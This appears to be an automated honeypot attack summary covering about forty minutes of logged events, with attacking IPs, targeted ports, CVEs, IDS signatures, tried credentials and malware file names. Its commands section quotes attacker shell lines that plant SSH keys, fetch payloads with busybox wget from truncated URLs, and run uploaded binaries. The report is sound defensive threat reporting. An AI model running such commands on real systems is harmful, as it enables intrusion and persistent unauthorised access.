
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-25T09:01:32Z
**Timeframe:** 2025-10-25T08:20:01Z to 2025-10-25T09:00:01Z

**Files Used:**
- agg_log_20251025T082001Z.json
- agg_log_20251025T084001Z.json
- agg_log_20251025T090001Z.json

---

## Executive Summary

This report summarizes 19,292 malicious events targeting our honeypot infrastructure over the last hour. The most prominent attacks were reconnaissance and brute-force attempts, with a significant number of events logged by the Cowrie, Honeytrap, and Suricata honeypots. The most active attacking IP address was 109.205.211.9. Attackers frequently targeted VNC (vnc/5900), SSH (22) and SIP (5060) ports. Several vulnerabilities were targeted, including CVE-2002-0013 and CVE-2002-0012. A variety of malicious commands were attempted, including the download and execution of malware.

---

## Detailed Analysis

### Attacks by Honeypot
- Cowrie
- Honeytrap
- Suricata
- Heralding
- Ciscoasa
- Dionaea
- Sentrypeer
- Mailoney
- Miniprint
- Adbhoney
- Tanner
- H0neytr4p
- Redishoneypot
- ConPot
- Ipphoney
- Honeyaml

### Top Attacking IPs
- 109.205.211.9
- 185.243.96.105
- 80.94.95.238
- 106.14.67.229
- 188.166.24.228
- 159.89.166.213
- 72.240.125.133
- 14.103.135.94
- 203.135.22.130
- 115.190.1.156
- 181.188.176.250
- 61.219.181.31
- 107.170.36.5
- 95.215.108.8
- 103.186.1.59
- 5.182.209.68
- 154.221.28.214
- 77.83.207.203
- 172.176.97.33
- 122.13.25.186

### Top Targeted Ports/Protocols
- vnc/5900
- 22
- 5060
- 3306
- 445
- 5903
- 8333
- 5901
- 25
- 1433
- 5904
- 5905
- 9100
- 1521
- 23
- 5907
- 5908
- 5909
- 8022
- 10089

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-1999-0265
- CVE-1999-0183

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- uname -a
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; ...
- cd /data/local/tmp/; rm *; busybox wget http://...
- uname -s -v -n -r -m
- scp -t /tmp/oYVrjdCc
- ./oYVrjdCc
- cd /tmp && chmod +x oYVrjdCc && bash -c ./oYVrjdCc

### Signatures Triggered
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET HUNTING RDP Authentication Bypass Attempt
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 47
- ET SCAN Suspicious inbound to Oracle SQL port 1521
- ET CINS Active Threat Intelligence Poor Reputation IP group 44
- ET CINS Active Threat Intelligence Poor Reputation IP group 51

### Users / Login Attempts
- root/
- bob/
- root/Enrike
- root/ensunadmin201
- 345gs5662d34/345gs5662d34
- root/entire
- root/entire123
- root/EntradaPlanta8014
- /Passw0rd
- root/epadilla

### Files Uploaded/Downloaded
- wget.sh;
- arm.urbotnetisass;
- arm.urbotnetisass
- c.sh;
- w.sh;
- perl|perl
- oYVrjdCc

### HTTP User-Agents
- No user agents were logged in this period.

### SSH Clients
- No SSH clients were logged in this period.

### SSH Servers
- No SSH servers were logged in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were logged in this period.

---

## Key Observations and Anomalies

- A significant number of commands are related to setting up SSH authorized keys, indicating attempts to establish persistent access.
- Attackers are using `wget` and `curl` to download and execute malicious scripts from remote servers.
- The most common attack vectors appear to be brute-force attacks against SSH and VNC, as well as scans for common vulnerabilities.
- There is a notable amount of scanning for MS Terminal Server, RDP, and various database ports (MSSQL, Oracle).
- The presence of commands targeting Android (`/data/local/tmp/`) suggests that some of the attacks are aimed at compromising mobile devices or emulators.

---
